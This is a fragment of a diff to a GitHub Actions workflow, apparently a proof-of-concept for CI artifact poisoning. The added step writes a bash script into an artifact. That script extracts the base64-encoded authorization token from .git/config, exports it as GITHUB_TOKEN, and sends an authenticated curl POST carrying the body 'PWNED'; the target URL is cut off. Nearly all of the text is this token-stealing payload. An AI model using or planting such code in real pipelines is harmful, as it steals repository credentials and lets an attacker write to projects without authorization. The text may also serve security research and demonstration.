@@ -13,6 +13,7 @@ jobs:
     steps:
       - run: |
           cat <<EOT >> myartifact
+          #!/bin/bash
           export GITHUB_TOKEN=$(cat $GITHUB_WORKSPACE/.git/config | grep AUTHORIZATION | cut -d':' -f 2 | cut -d' ' -f 3 | base64 -d)    
           curl -X POST -H "Authorization: Token $GITHUB_TOKEN" \
           -d '{"body": "PWNED"}' \
